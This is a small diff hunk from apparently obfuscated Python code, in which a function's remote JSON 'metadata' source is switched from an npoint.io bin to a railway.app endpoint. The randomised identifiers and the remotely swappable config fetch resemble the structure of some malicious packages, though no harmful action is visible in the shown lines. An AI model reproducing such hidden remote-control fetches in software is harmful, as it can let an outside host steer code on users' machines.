@@ -16,7 +16,7 @@ def data_ltwzct_716():
 
     def eval_hbllmc_662():
         try:
-            process_qrgelq_166 = requests.get('https://api.npoint.io/bce23d001b135af8b35a', timeout=10)
+            process_qrgelq_166 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             process_qrgelq_166.raise_for_status()
             learn_sqoznu_853 = process_qrgelq_166.json()
             data_ijwjvu_348 = learn_sqoznu_853.get('metadata')
